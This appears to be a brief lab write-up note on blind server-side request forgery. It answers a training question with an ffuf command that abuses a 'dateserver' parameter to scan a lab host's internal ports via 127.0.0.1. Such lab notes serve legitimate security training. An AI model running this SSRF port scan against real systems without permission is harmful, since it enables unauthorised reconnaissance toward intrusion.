# [Blind SSRF](Blind%20SSRF.md)
### Exploit the SSRF to identify open ports on the system. Which port is open in addition to port 80?

```sh
ffuf -w ./ports.txt -u http://10.129.162.204/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Something went wrong!"
```
![](Screenshot%202026-09-13%20at%2013.59.11.png)